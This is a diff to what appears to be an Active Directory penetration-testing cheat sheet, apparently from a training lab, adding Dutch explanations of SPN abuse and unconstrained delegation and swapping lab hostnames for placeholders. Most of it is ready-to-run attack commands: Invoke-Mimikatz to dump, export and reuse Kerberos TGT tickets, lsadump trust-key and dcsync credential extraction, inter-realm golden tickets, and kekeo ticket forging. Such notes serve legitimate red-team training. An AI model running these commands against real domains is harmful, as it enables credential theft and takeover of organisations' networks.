@@ -808,7 +808,8 @@ Hashcat -a 0 -m 18200 hash.txt rockyou.txt
 ```
 
 ## Set SPN
-With enough rights (GenericAll, GenericWrite), a target user SPN can be set to anything, but needs to be unique in the domain.
+Met genoeg rechten (GenericALL en GenericWrite) is het mogelijk om zelf de Service Principle Name attribute aan een gebruiker toe te voegen. Deze kan dan worden gekraakt met behulp van kerberoasting.
+
 #### Enumerate permissions for group on ACL
 ```
 Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match “<groupname>”}
@@ -849,8 +850,10 @@ Get-DomainUser -Identity <username> | Get-DomainSPNTicket | select -ExpandProper
 ```
 
 ## Unconstrained Delegation
-#### Discover domain computer which have unconstrained delegation
-DC always show up, ignore them
+Unconstrained delegation is een privilege welke kan worden toegekent aan gebruikers of computers, dit gebeurt bijna altijd bij computers met services zoals ISS en MSSQL. Deze services hebben meestal toegang nodig tot een backend database namens de geverifieerde gebruiker. Wanneer een gebruiker zich verifieert op een computer waarop onbeperkt Kerberos-delegatierecht is ingeschakeld, wordt het geverifieerde TGT-ticket van de gebruiker opgeslagen in het geheugen van die computer. Als je administrator toegang hebt tot deze server, is het mogelijk om alle TGT tickets uit het geheugen te dumpen.
+
+#### Discover domain computers which have unconstrained delegation
+Domain Controllers always show up, ignore them
 ```
 Get-Netcomputer -UnConstrained
 ```
@@ -861,24 +864,24 @@ Wait for a domain admin to login while checking for tokens
 Invoke-Mimikatz -Command '"sekurlsa::tickets"'
 ```
 
-#### Export the Domain admin ticket
+#### Export the TGT ticket
 ```
 Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 ```
 
-#### Reuse the Domain admin ticket
+#### Reuse the TGT ticket
 ```
 Invoke-Mimikatz -Command '"kerberos:ptt"' <kirbi file>
 ```
 
 ## Constrained Delegation
 ### Enumerate
-#### Enumerate users with contrained delegation enables
+#### Enumerate users with contrained delegation enabled
 ```
 Get-DomainUser -TrustedToAuth
 ```
 
-#### Enumerate computers with contrained delegation enables
+#### Enumerate computers with contrained delegation enabled
 ```
 Get-Domaincomputer -TrustedToAuth
 ```
@@ -943,7 +946,7 @@ Look for in trust key from child to parent (first command)
 Look for NTLM hash (second command)
 ```
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <computername>
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<computername>$"'
 ```
 
 #### Create an inter-realm TGT
@@ -953,12 +956,12 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain>
 
 #### Create a TGS for a service (kekeo_old)
 ```
-./asktgs.exe <kirbi file> CIFS/mcorp-dc.moneycorp.local
+./asktgs.exe <kirbi file> CIFS/<forest dc name>
 ```
 
 #### Use TGS to access the targeted service (may need to run it twice) (kekeo_old)
 ```
-./kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
+./kirbikator.exe lsa .\<kirbi file>
 ```
 
 #### Check access to server
